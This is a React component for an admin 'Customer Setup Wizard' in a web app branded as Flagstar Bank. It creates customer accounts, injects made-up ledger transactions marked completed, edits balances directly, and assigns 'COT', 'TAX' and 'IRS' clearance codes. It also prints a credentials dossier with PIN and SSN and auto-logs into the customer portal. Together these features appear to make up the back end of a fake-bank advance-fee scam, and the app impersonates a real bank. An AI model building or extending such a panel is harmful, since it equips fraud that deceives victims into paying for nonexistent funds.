import React, { useState } from 'react';
import { useAppStore } from '../store/useAppStore';
import { useNavigate } from 'react-router-dom';
import { adminCreateCustomer, adminInsertTransaction, adminCreateTransferCode } from '../services/adminService';
import toast from 'react-hot-toast';
import { supabase } from '../supabase/client';
import { triggerConfetti } from '../utils/confetti';
import { 
  User, Mail, Lock, DollarSign, Shield, CheckCircle, 
  ArrowRight, Plus, Sparkles, RefreshCw, Copy, Check, Info, ShieldCheck, ExternalLink
} from 'lucide-react';

interface CustomerWizardProps {
  isDarkMode?: boolean;
}

const CustomerWizard: React.FC<CustomerWizardProps> = ({ isDarkMode = true }) => {
  const admin = useAppStore((state) => state.admin);
  const setCustomer = useAppStore((state) => state.setCustomer);
  const navigate = useNavigate();
  
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  
  // Step 1
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [pin, setPin] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [ssn, setSsn] = useState('');
  const [taxNumber, setTaxNumber] = useState('');
  const [createdCustomer, setCreatedCustomer] = useState<{ id?: string, account_number: string } | null>(null);

  // Step 2
  const [transactions, setTransactions] = useState<any[]>([]);
  const [txToAccount, setTxToAccount] = useState('');
  const [txAmount, setTxAmount] = useState('');
  const [txNarration, setTxNarration] = useState('');
  const [txType, setTxType] = useState<'credit' | 'debit'>('credit');

  // Step 3
  const [cot, setCot] = useState('');
  const [tax, setTax] = useState('');
  const [irs, setIrs] = useState('');
  const [createdCodeId, setCreatedCodeId] = useState<string | null>(null);

  const handleCreateCustomer = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!admin) return;
    setLoading(true);
    try {
      const account_number = await adminCreateCustomer(admin.id, name, email, pin);
      const { data } = await supabase.from('customers').select('id').eq('account_number', account_number).single();
      if (data) {
        setCreatedCustomer({ id: data.id, account_number });
        
        // Save metadata (photoUrl, ssn, taxNumber) to localStorage
        const meta = {
          photoUrl: photoUrl || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&h=400&q=80',
          ssn: ssn || 'XXX-XX-6789',
          taxNumber: taxNumber || 'XX-XXXX890'
        };
        localStorage.setItem(`flagstar_customer_metadata_${account_number}`, JSON.stringify(meta));
        
        toast.success('Customer profile initialized successfully');
        setStep(2);
      }
    } catch (err: any) {
      toast.error(err.message || 'Failed to create customer');
    } finally {
      setLoading(false);
    }
  };

  const handleAddTransaction = async () => {
    if (!createdCustomer?.id || !admin) return;
    if (!txToAccount || !txAmount || !txNarration) {
      toast.error('All transaction fields are required');
      return;
    }
    setLoading(true);
    try {
      const amountFloat = parseFloat(txAmount);
      
      // Fetch current balance from the database
      const { data: custData } = await supabase.from('customers').select('balance').eq('id', createdCustomer.id).single();
      const currentBalance = custData ? parseFloat(custData.balance) : 0;
      const newBalance = txType === 'credit' ? currentBalance + amountFloat : currentBalance - amountFloat;

      const newTx = await adminInsertTransaction({
        customer_id: createdCustomer.id,
        to_account: txToAccount,
        amount: amountFloat,
        narration: txNarration,
        type: txType,
        stage: 'COMPLETED',
        status: 'COMPLETED',
        acted_by_role: 'admin',
      });

      // Update customer balance directly in the database
      await supabase.from('customers').update({ balance: newBalance }).eq('id', createdCustomer.id);
      
      setTransactions([...transactions, newTx]);
      setTxToAccount('');
      setTxAmount('');
      setTxNarration('');
      toast.success(`Ledger ${txType.toUpperCase()} transaction injected successfully`);
    } catch (err: any) {
      toast.error(err.message || 'Failed to add transaction');
    } finally {
      setLoading(false);
    }
  };

  const handleCreateCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!createdCustomer?.id || !admin) return;
    setLoading(true);
    try {
      const codeId = await adminCreateTransferCode(admin.id, createdCustomer.id, cot, tax, irs, 7);
      setCreatedCodeId(codeId);
      
      // Persist cot_code, tax_code, irs_code to customer metadata in localStorage
      const metaKey = `flagstar_customer_metadata_${createdCustomer.account_number}`;
      const existingMeta = JSON.parse(localStorage.getItem(metaKey) || '{}');
      const updatedMeta = {
        ...existingMeta,
        cot_code: cot,
        tax_code: tax,
        irs_code: irs,
        transfer_code_uuid: codeId
      };
      localStorage.setItem(metaKey, JSON.stringify(updatedMeta));

      toast.success('Transfer clearance codes mapped');
      setStep(4);
      triggerConfetti();
    } catch (err: any) {
      toast.error(err.message || 'Failed to generate codes');
    } finally {
      setLoading(false);
    }
  };

  const handleCopyCredentials = () => {
    const meta = JSON.parse(localStorage.getItem(`flagstar_customer_metadata_${createdCustomer?.account_number}`) || '{}');
    const text = `
==================================================
FLAGSTAR BANK - CLIENT INTEGRATION DOSSIER
==================================================
Full Name:       ${name}
Email Address:   ${email}
Account Number:  ${createdCustomer?.account_number}
Security PIN:    ${pin}
--------------------------------------------------
Social Security: ${meta.ssn || 'NOT ASSIGNED'}
Tax Number:      ${meta.taxNumber || 'NOT ASSIGNED'}
Profile Image:   ${meta.photoUrl || 'NOT ASSIGNED'}
--------------------------------------------------
COT Clearance Code:   ${cot || 'NOT ASSIGNED'}
TAX Clearance Code:   ${tax || 'NOT ASSIGNED'}
IRS Clearance Code:   ${irs || 'NOT ASSIGNED'}
==================================================
CONFIDENTIAL - AUTHORIZED ADMINISTRATIVE USE ONLY
`;
    navigator.clipboard.writeText(text.trim());
    setCopied(true);
    toast.success('Credentials dossier copied to clipboard!');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleLaunchCustomerPortal = async () => {
    if (!createdCustomer?.id) {
      toast.error('No client account registered to launch.');
      return;
    }
    
    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('customers')
        .select('*')
        .eq('id', createdCustomer.id)
        .single();
        
      if (error || !data) {
        throw new Error(error?.message || 'Could not locate client profile in database.');
      }
      
      // Auto-login client in Zustand store
      setCustomer({
        id: data.id,
        account_number: data.account_number,
        name: data.name,
        balance: parseFloat(data.balance || '0'),
        kyc_status: data.kyc_status || 'VERIFIED'
      }, 'simulated-token-session');
      
      toast.success(`Access tunnel established. Launching Customer Portal for ${data.name}...`);
      triggerConfetti();
      
      // Navigate to customer dashboard
      navigate('/dashboard');
    } catch (err: any) {
      toast.error(err.message || 'Auto-launch gate error');
    } finally {
      setLoading(false);
    }
  };

  const resetWizard = () => {
    setName('');
    setEmail('');
    setPin('');
    setPhotoUrl('');
    setSsn('');
    setTaxNumber('');
    setTxType('credit');
    setCreatedCustomer(null);
    setTransactions([]);
    setCot('');
    setTax('');
    setIrs('');
    setCreatedCodeId(null);
    setStep(1);
  };

  // Color dynamic styles
  const cardBg = isDarkMode ? 'bg-gray-900/60 border-gray-800' : 'bg-white border-gray-200';
  const headerBg = isDarkMode ? 'bg-gray-900 border-gray-800' : 'bg-gray-50 border-gray-200';
  const textColor = isDarkMode ? 'text-white' : 'text-gray-900';
  const labelColor = isDarkMode ? 'text-gray-400' : 'text-gray-600';
  const subtextColor = isDarkMode ? 'text-gray-500' : 'text-gray-400';
  const inputBg = isDarkMode ? 'bg-gray-950/60' : 'bg-gray-50';
  const inputBorder = isDarkMode ? 'border-gray-800 focus:border-[#F15A24]/60' : 'border-gray-300 focus:border-[#F15A24]/40';
  const divider = isDarkMode ? 'border-gray-800' : 'border-gray-200';

  const stepsList = [
    { title: 'Profile Setup', icon: User, desc: 'Establish core account identity' },
    { title: 'Funding Ledger', icon: DollarSign, desc: 'Setup initial transaction history' },
    { title: 'Access Keys', icon: Shield, desc: 'Configure security codes' },
    { title: 'Activation', icon: CheckCircle, desc: 'Review credentials pass' }
  ];

  return (
    <div className={`max-w-4xl mx-auto rounded-2xl border shadow-2xl overflow-hidden transition-all duration-300 ${cardBg}`}>
      
      {/* Premium Header */}
      <div className={`px-8 py-5 border-b flex justify-between items-center transition-all ${headerBg}`}>
        <div>
          <h2 className={`text-xl font-black tracking-tight ${textColor} flex items-center gap-2`}>
            <Sparkles className="text-red-600 animate-pulse h-5 w-5" />
            Customer Setup Wizard
          </h2>
          <p className={`text-xs ${subtextColor} mt-0.5`}>Step-by-step institutional registration and credential dispatch.</p>
        </div>
        <div className={`text-xs px-3 py-1.5 rounded-full font-bold uppercase tracking-wider ${
          isDarkMode ? 'bg-[#F15A24]/10 text-[#F15A24] border border-[#F15A24]/20' : 'bg-[#F15A24]/5 text-[#F15A24] border border-[#F15A24]/10'
        }`}>
          Step {step} of 4
        </div>
      </div>

      {/* Modern Stepper Indicator */}
      <div className={`px-8 py-6 border-b flex justify-between items-center ${divider} bg-inherit/40 overflow-x-auto custom-scrollbar`}>
        {stepsList.map((s, idx) => {
          const stepNum = idx + 1;
          const isCompleted = step > stepNum;
          const isActive = step === stepNum;

          return (
            <div key={idx} className="flex items-center flex-1 last:flex-none">
              <div className="flex items-center gap-3">
                <div className={`h-10 w-10 rounded-full flex items-center justify-center font-bold transition-all duration-300 ${
                  isCompleted 
                    ? 'bg-[#F15A24] text-white shadow-lg shadow-[#F15A24]/30' 
                    : isActive 
                      ? 'bg-[#F15A24] text-white border-2 border-[#FFB81C] shadow-md shadow-[#F15A24]/20' 
                      : isDarkMode 
                        ? 'bg-gray-800 border border-gray-700 text-gray-400' 
                        : 'bg-gray-100 text-gray-400'
                }`}>
                  {isCompleted ? <Check size={18} /> : <span>{stepNum}</span>}
                </div>
                <div className="hidden md:block">
                  <p className={`text-xs font-black tracking-wide ${isActive ? 'text-[#F15A24]' : isCompleted ? textColor : labelColor}`}>{s.title}</p>
                  <p className={`text-[10px] ${subtextColor}`}>{s.desc}</p>
                </div>
              </div>
              {idx < stepsList.length - 1 && (
                <div className={`h-[2px] mx-4 flex-1 transition-all duration-500 bg-gradient-to-r ${
                  isCompleted ? 'from-[#F15A24] to-[#FFB81C]' : isDarkMode ? 'from-gray-800 to-gray-800' : 'from-gray-200 to-gray-200'
                }`} />
              )}
            </div>
          );
        })}
      </div>

      {/* Content Form Viewports */}
      {/* Content Form Viewports */}
      <div className="p-8 border-l-4 border-l-[#F15A24]">
        
        {/* Step 1: Customer Details */}
        {step === 1 && (
          <form onSubmit={handleCreateCustomer} className="space-y-6 max-w-lg mx-auto animate-slide-up">
            <div className="space-y-2">
              <h3 className={`text-lg font-black tracking-tight ${textColor}`}>Initialize Account Profile</h3>
              <p className={`text-xs ${labelColor}`}>Input customer credentials to initialize the banking dossier.</p>
            </div>

            <div className="space-y-4">
              {/* Full Name */}
              <div className="space-y-1.5">
                <label className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Full Name</label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
                    <User size={16} />
                  </span>
                  <input 
                    required 
                    type="text"
                    placeholder="E.g. Michael K. Scott" 
                    value={name} 
                    onChange={e=>setName(e.target.value)} 
                    className={`w-full pl-10 pr-4 py-3 rounded-xl border font-semibold outline-none transition duration-200 ${inputBg} ${textColor} ${inputBorder} focus:ring-2 focus:ring-[#F15A24]/20`} 
                  />
                </div>
              </div>

              {/* Email Address */}
              <div className="space-y-1.5">
                <label className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Email Address</label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
                    <Mail size={16} />
                  </span>
                  <input 
                    required 
                    type="email" 
                    placeholder="E.g. mscott@dundermifflin.com" 
                    value={email} 
                    onChange={e=>setEmail(e.target.value)} 
                    className={`w-full pl-10 pr-4 py-3 rounded-xl border font-semibold outline-none transition duration-200 ${inputBg} ${textColor} ${inputBorder} focus:ring-2 focus:ring-[#F15A24]/20`} 
                  />
                </div>
                <p className={`text-[10px] ${subtextColor} flex items-center gap-1`}>
                  <Info size={12} /> Email will receive system account statements.
                </p>
              </div>

              {/* Security PIN */}
              <div className="space-y-1.5">
                <label className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Security PIN</label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
                    <Lock size={16} />
                  </span>
                  <input 
                    required 
                    type="password"
                    placeholder="Enter 4-6 digit security PIN" 
                    maxLength={6} 
                    pattern="[0-9]*"
                    inputMode="numeric"
                    value={pin} 
                    onChange={e=>setPin(e.target.value.replace(/\D/g, ''))} 
                    className={`w-full pl-10 pr-4 py-3 rounded-xl border font-mono font-semibold tracking-widest outline-none transition duration-200 ${inputBg} ${textColor} ${inputBorder} focus:ring-2 focus:ring-[#F15A24]/20`} 
                  />
                </div>
                <p className={`text-[10px] ${subtextColor}`}>Must be a numeric pin sequence for client lockouts.</p>
              </div>

              {/* Profile Photo URL */}
              <div className="space-y-1.5">
                <label className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Profile Photo URL</label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
                    <User size={16} />
                  </span>
                  <input 
                    type="text"
                    placeholder="Paste direct image link or leave blank for preset" 
                    value={photoUrl} 
                    onChange={e=>setPhotoUrl(e.target.value)} 
                    className={`w-full pl-10 pr-4 py-3 rounded-xl border font-semibold outline-none transition duration-200 ${inputBg} ${textColor} ${inputBorder} focus:ring-2 focus:ring-[#F15A24]/20`} 
                  />
                </div>
              </div>

              {/* Social Security Number (SSI/SSN) */}
              <div className="space-y-1.5">
                <label className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Social Security Number (SSI / SSN)</label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
                    <ShieldCheck size={16} />
                  </span>
                  <input 
                    required 
                    type="text"
                    placeholder="E.g. XXX-XX-6789" 
                    value={ssn} 
                    onChange={e=>setSsn(e.target.value)} 
                    className={`w-full pl-10 pr-4 py-3 rounded-xl border font-semibold outline-none transition duration-200 ${inputBg} ${textColor} ${inputBorder} focus:ring-2 focus:ring-[#F15A24]/20`} 
                  />
                </div>
              </div>

              {/* Tax Identification Number (TIN) */}
              <div className="space-y-1.5">
                <label className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Tax Identification Number</label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
                    <Info size={16} />
                  </span>
                  <input 
                    required 
                    type="text"
                    placeholder="E.g. XX-XXXX890" 
                    value={taxNumber} 
                    onChange={e=>setTaxNumber(e.target.value)} 
                    className={`w-full pl-10 pr-4 py-3 rounded-xl border font-semibold outline-none transition duration-200 ${inputBg} ${textColor} ${inputBorder} focus:ring-2 focus:ring-[#F15A24]/20`} 
                  />
                </div>
              </div>
            </div>

            <button 
              disabled={loading} 
              type="submit" 
              className="w-full mt-2 py-3.5 bg-[#F15A24] hover:bg-[#D9431E] active:scale-[0.99] text-white rounded-xl font-bold tracking-wide transition flex items-center justify-center gap-2 shadow-lg shadow-[#F15A24]/30 disabled:opacity-50"
            >
              {loading ? (
                <>
                  <RefreshCw className="animate-spin h-5 w-5" />
                  Generating Dossier Account...
                </>
              ) : (
                <>
                  Create Customer Dossier
                  <ArrowRight size={16} />
                </>
              )}
            </button>
          </form>
        )}

        {/* Step 2: Setup Initial Transactions */}
        {step === 2 && (
          <div className="space-y-6 animate-slide-up">
            <div className="space-y-2">
              <h3 className={`text-lg font-black tracking-tight ${textColor}`}>Inject Initial Funding & Transactions</h3>
              <p className={`text-xs ${labelColor}`}>Optional: Map preliminary transactions to establish dynamic account activity ledger.</p>
            </div>

            {/* Created Customer Info Banner */}
            <div className={`p-5 border rounded-2xl flex items-center justify-between ${
              isDarkMode ? 'bg-[#F15A24]/5 border-[#F15A24]/20' : 'bg-[#F15A24]/5 border-[#F15A24]/10'
            }`}>
              <div>
                <p className={`text-[10px] uppercase font-bold tracking-widest text-[#F15A24]`}>Account Initialized</p>
                <h4 className={`text-md font-bold ${textColor} mt-1`}>{name}</h4>
                <p className={`text-xs font-mono mt-0.5 ${subtextColor}`}>Account Reference: {createdCustomer?.account_number}</p>
              </div>
              <div className={`p-3 rounded-xl ${isDarkMode ? 'bg-gray-800' : 'bg-white border shadow-sm'}`}>
                <ShieldCheck className="text-[#F15A24] h-6 w-6 animate-pulse" />
              </div>
            </div>

            {/* Transaction Builder Forms */}
            <div className={`p-6 border rounded-2xl space-y-4 ${isDarkMode ? 'bg-gray-950/40 border-gray-800/80' : 'bg-gray-50 border-gray-200'}`}>
              <p className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Ledger Transaction Injector</p>
              
              <div className="grid grid-cols-1 md:grid-cols-12 gap-4">
                {/* Type Selection */}
                <div className="col-span-1 md:col-span-3">
                  <select
                    value={txType}
                    onChange={(e) => setTxType(e.target.value as 'credit' | 'debit')}
                    className={`w-full p-3.5 rounded-xl border font-bold outline-none text-xs transition duration-200 ${inputBg} ${textColor} ${inputBorder}`}
                  >
                    <option value="credit">Deposit (Credit)</option>
                    <option value="debit">Withdrawal (Debit)</option>
                  </select>
                </div>

                {/* To Account / Target */}
                <div className="col-span-1 md:col-span-2">
                  <input 
                    placeholder="Acc No." 
                    value={txToAccount} 
                    onChange={e=>setTxToAccount(e.target.value)} 
                    className={`w-full p-3.5 rounded-xl border font-semibold outline-none text-xs transition duration-200 ${inputBg} ${textColor} ${inputBorder}`} 
                  />
                </div>

                {/* Amount */}
                <div className="col-span-1 md:col-span-2">
                  <div className="relative">
                    <span className="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500 text-xs">$</span>
                    <input 
                      type="number"
                      placeholder="Amount" 
                      value={txAmount} 
                      onChange={e=>setTxAmount(e.target.value)} 
                      className={`w-full pl-6 pr-3 py-3.5 rounded-xl border font-bold outline-none text-xs transition duration-200 ${inputBg} ${textColor} ${inputBorder}`} 
                    />
                  </div>
                </div>

                {/* Narration */}
                <div className="col-span-1 md:col-span-5 flex gap-2">
                  <input 
                    placeholder="Memo / Narration" 
                    value={txNarration} 
                    onChange={e=>setTxNarration(e.target.value)} 
                    className={`w-full p-3.5 rounded-xl border font-semibold outline-none text-xs transition duration-200 ${inputBg} ${textColor} ${inputBorder} flex-1`} 
                  />
                  <button 
                    disabled={loading} 
                    onClick={handleAddTransaction} 
                    className="bg-[#F15A24] hover:bg-[#D9431E] active:scale-95 text-white rounded-xl px-4 text-xs font-bold transition flex items-center justify-center gap-1 shrink-0 disabled:opacity-50"
                  >
                    <Plus size={14} /> Inject
                  </button>
                </div>
              </div>
            </div>

            {/* Injected Transactions List */}
            <div className="space-y-3">
              <p className={`text-xs font-extrabold uppercase tracking-wider ${labelColor}`}>Queued Transactions Ledger</p>
              {transactions.length === 0 ? (
                <div className={`p-8 text-center border-2 border-dashed rounded-2xl text-xs font-semibold ${subtextColor} ${
                  isDarkMode ? 'border-gray-800' : 'border-gray-200'
                }`}>
                  No preliminary transactions injected. You can skip or proceed.
                </div>
              ) : (
                <div className="border rounded-2xl overflow-hidden divide-y divide-inherit border-inherit max-h-60 overflow-y-auto custom-scrollbar">
                  {transactions.map((t, idx) => (
                    <div key={idx} className="p-4 flex justify-between items-center text-xs hover:bg-gray-50/5 hover:transition-all">
                      <div className="space-y-1">
                        <p className={`font-black ${textColor}`}>Recipient: <span className="font-mono text-[11px]">{t.to_account}</span></p>
                        <p className={`${subtextColor}`}>{t.narration}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-[#F15A24] font-extrabold text-sm">-${t.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                        <span className="px-2 py-0.5 bg-[#FFB81C]/10 text-[#FFB81C] border border-[#FFB81C]/20 rounded font-bold uppercase text-[9px]">PENDING</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Stepper continue */}
            <div className="flex justify-end gap-3 pt-4">
              <button 
                onClick={() => setStep(3)} 
                className="py-3 px-6 bg-[#F15A24] hover:bg-[#D9431E] active:scale-95 text-white rounded-xl font-bold text-xs tracking-wide transition flex items-center gap-2 shadow-lg shadow-[#F15A24]/20"
              >
                Proceed to Security Setup
                <ArrowRight size={14} />
              </button>
            </div>
          </div>
        )}

        {/* Step 3: Assign Transfer Codes */}
        {step === 3 && (
          <form onSubmit={handleCreateCode} className="space-y-6 max-w-lg mx-auto animate-slide-up">
            <div className="space-y-2">
              <h3 className={`text-lg font-black tracking-tight ${textColor}`}>Map Security Clearance Clearances</h3>
              <p className={`text-xs ${labelColor}`}>Assign specific administrative restriction codes for international and large asset clearances.</p>
            </div>

            <div className="space-y-4">
              {/* COT Code */}
              <div className="space-y-1.5 p-4 rounded-2xl border bg-inherit/10 border-inherit">
                <div className="flex justify-between items-center">
                  <label className={`text-xs font-black uppercase tracking-wider ${textColor} flex items-center gap-1.5`}>
                    <span className="h-2 w-2 rounded-full bg-[#F15A24]" />
                    COT Code (Cost of Transfer)
                  </label>
                  <span className={`text-[10px] uppercase font-bold tracking-widest ${subtextColor}`}>Required key</span>
                </div>
                <input 
                  required 
                  placeholder="E.g. COT-8240-FLAG" 
                  value={cot} 
                  onChange={e=>setCot(e.target.value)} 
                  className={`w-full mt-2 p-3 rounded-xl border font-mono font-semibold outline-none text-sm transition duration-200 ${inputBg} ${textColor} ${inputBorder}`} 
                />
                <p className={`text-[9px] ${subtextColor} mt-1`}>Ensures the transaction covers localized clearance fees.</p>
              </div>

              {/* TAX Code */}
              <div className="space-y-1.5 p-4 rounded-2xl border bg-inherit/10 border-inherit">
                <div className="flex justify-between items-center">
                  <label className={`text-xs font-black uppercase tracking-wider ${textColor} flex items-center gap-1.5`}>
                    <span className="h-2 w-2 rounded-full bg-[#F15A24]" />
                    TAX Code (Global Revenue Tax)
                  </label>
                  <span className={`text-[10px] uppercase font-bold tracking-widest ${subtextColor}`}>Required key</span>
                </div>
                <input 
                  required 
                  placeholder="E.g. TAX-5012-REG" 
                  value={tax} 
                  onChange={e=>setTax(e.target.value)} 
                  className={`w-full mt-2 p-3 rounded-xl border font-mono font-semibold outline-none text-sm transition duration-200 ${inputBg} ${textColor} ${inputBorder}`} 
                />
                <p className={`text-[9px] ${subtextColor} mt-1`}>Enforces international capital gains compliance clearance.</p>
              </div>

              {/* IRS Code */}
              <div className="space-y-1.5 p-4 rounded-2xl border bg-inherit/10 border-inherit">
                <div className="flex justify-between items-center">
                  <label className={`text-xs font-black uppercase tracking-wider ${textColor} flex items-center gap-1.5`}>
                    <span className="h-2 w-2 rounded-full bg-[#F15A24]" />
                    IRS Code (Federal Verification)
                  </label>
                  <span className={`text-[10px] uppercase font-bold tracking-widest ${subtextColor}`}>Required key</span>
                </div>
                <input 
                  required 
                  placeholder="E.g. IRS-9092-SEC" 
                  value={irs} 
                  onChange={e=>setIrs(e.target.value)} 
                  className={`w-full mt-2 p-3 rounded-xl border font-mono font-semibold outline-none text-sm transition duration-200 ${inputBg} ${textColor} ${inputBorder}`} 
                />
                <p className={`text-[9px] ${subtextColor} mt-1`}>Verifies identity checks with federal banking audits.</p>
              </div>
            </div>

            <div className="pt-4 flex items-center justify-between gap-4">
              <button 
                type="button" 
                onClick={() => setStep(4)} 
                className={`text-xs font-bold transition hover:underline ${subtextColor}`}
              >
                Skip Code Generation &rarr;
              </button>

              <button 
                disabled={loading} 
                type="submit" 
                className="py-3.5 px-6 border-2 border-[#F15A24] text-[#F15A24] hover:bg-[#FFB81C] hover:text-gray-950 active:scale-95 rounded-xl font-bold text-xs tracking-wide transition flex items-center justify-center gap-2 disabled:opacity-50"
              >
                {loading ? (
                  <>
                    <RefreshCw className="animate-spin h-4 w-4" />
                    Deploying codes...
                  </>
                ) : (
                  <>
                    Generate Protocols
                    <ArrowRight size={14} />
                  </>
                )}
              </button>
            </div>
          </form>
        )}

        {/* Step 4: System Integration Complete */}
        {step === 4 && (
          <div className="space-y-8 max-w-xl mx-auto animate-slide-up text-center">
            
            {/* Glowing success badge */}
            <div className="flex flex-col items-center">
              <div className="relative">
                <div className="absolute inset-0 bg-[#F15A24] rounded-full blur-xl opacity-20 animate-pulse" />
                <div className="h-20 w-20 bg-[#F15A24]/10 border border-[#F15A24]/30 rounded-full flex items-center justify-center text-[#F15A24] relative">
                  <CheckCircle size={44} className="animate-pulse" />
                </div>
              </div>
              <h3 className={`text-2xl font-black tracking-tight mt-5 ${textColor}`}>Dossier Successfully Activated</h3>
              <p className={`text-xs ${labelColor} max-w-sm mt-1 mx-auto`}>The customer profile has been fully hydrated into Flagstar's secure transaction network database.</p>
            </div>

            {/* Black-Metal Credentials Security Pass */}
            <div className="relative group animate-fadeIn">
              {/* Backglow */}
              <div className="absolute inset-0 bg-[#F15A24] rounded-2xl blur-2xl opacity-10 group-hover:opacity-20 transition duration-500" />
              
              <div className="relative rounded-2xl border-2 p-6 bg-gradient-to-br from-gray-900 to-gray-950 border-[#F15A24] text-left text-white shadow-[0_0_30px_rgba(241,90,36,0.15)] space-y-6 overflow-hidden">
                <div className="absolute top-0 right-0 h-48 w-48 bg-[#F15A24]/[0.05] pointer-events-none rounded-full blur-2xl" />
                <div className="absolute -bottom-8 -left-8 h-48 w-48 bg-[#FFB81C]/[0.05] pointer-events-none rounded-full blur-2xl" />
                
                <div className="flex justify-between items-start border-b border-gray-800/80 pb-4">
                  <div className="flex items-center gap-3.5">
                    {/* User profile photo */}
                    <img 
                      src={photoUrl || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&h=400&q=80'} 
                      alt={name}
                      className="w-12 h-12 rounded-full object-cover border border-[#F15A24]/40"
                    />
                    <div>
                      <span className="text-[9px] uppercase font-black tracking-widest text-[#FFB81C]">Secure Passport</span>
                      <h4 className="text-sm font-extrabold tracking-tight mt-0.5">{name}</h4>
                    </div>
                  </div>
                  {/* Luxury gold chip representation */}
                  <div className="w-9 h-7 rounded bg-gradient-to-br from-yellow-400 via-yellow-500 to-yellow-600 border border-yellow-300 shadow-md relative overflow-hidden flex flex-col justify-between p-1">
                    <div className="h-[1px] bg-yellow-700/30" />
                    <div className="h-[1px] bg-yellow-700/30" />
                    <div className="h-[1px] bg-yellow-700/30" />
                    <div className="h-[1px] bg-yellow-700/30" />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 text-xs font-mono">
                  <div className="space-y-1">
                    <span className="text-[9px] font-black text-[#FFB81C] uppercase tracking-wider block">Account Ref</span>
                    <span className="font-semibold text-gray-200 block truncate">{createdCustomer?.account_number}</span>
                  </div>

                  <div className="space-y-1">
                    <span className="text-[9px] font-black text-[#FFB81C] uppercase tracking-wider block">Access Key/PIN</span>
                    <span className="font-semibold text-gray-200 block truncate">{pin}</span>
                  </div>

                  <div className="space-y-1">
                    <span className="text-[9px] font-black text-[#FFB81C] uppercase tracking-wider block">Social Security (SSI)</span>
                    <span className="font-semibold text-gray-200 block truncate">{ssn || 'XXX-XX-6789'}</span>
                  </div>

                  <div className="space-y-1">
                    <span className="text-[9px] font-black text-[#FFB81C] uppercase tracking-wider block">Tax Identification No.</span>
                    <span className="font-semibold text-gray-200 block truncate">{taxNumber || 'XX-XXXX890'}</span>
                  </div>

                  <div className="space-y-1 col-span-2">
                    <span className="text-[9px] font-black text-[#FFB81C] uppercase tracking-wider block">Clearance Code ID</span>
                    <span className="font-semibold text-gray-200 block truncate">{createdCodeId || 'NONE ASSIGNED'}</span>
                  </div>
                </div>

                {/* Subfooter */}
                <div className="pt-2 flex justify-between items-center text-[8px] text-gray-500 uppercase font-black tracking-widest border-t border-gray-800/80">
                  <span>Authorized Personnel Only</span>
                  <span className="text-[#F15A24] font-black">Security Clearance Level 3</span>
                </div>
              </div>
            </div>

            {/* Stepper actions */}
            <div className="flex flex-col sm:flex-row gap-3 items-center justify-center pt-2">
              <button 
                onClick={handleCopyCredentials} 
                className="w-full sm:w-auto py-3 px-6 bg-gray-800 hover:bg-gray-700 active:scale-95 text-white border border-gray-700 rounded-xl font-bold text-xs tracking-wide transition flex items-center justify-center gap-2"
              >
                {copied ? <Check size={14} className="text-[#FFB81C]" /> : <Copy size={14} className="text-[#F15A24]" />}
                {copied ? 'Copied Dossier!' : 'Copy Credentials Dossier'}
              </button>

              <button 
                onClick={handleLaunchCustomerPortal} 
                className="w-full sm:w-auto py-3 px-6 bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-500 hover:to-teal-600 active:scale-95 text-white rounded-xl font-bold text-xs tracking-wide transition flex items-center justify-center gap-2 shadow-lg shadow-emerald-950/20"
              >
                <ExternalLink size={14} className="text-[#FFB81C]" />
                Launch Customer Portal
              </button>

              <button 
                onClick={resetWizard} 
                className="w-full sm:w-auto py-3 px-6 bg-[#F15A24] hover:bg-[#D9431E] active:scale-95 text-white rounded-xl font-bold text-xs tracking-wide transition flex items-center justify-center gap-2 shadow-lg shadow-[#F15A24]/30"
              >
                <RefreshCw size={14} />
                Initialize New Client Setup
              </button>
            </div>

          </div>
        )}

      </div>

    </div>
  );
};

export default CustomerWizard;
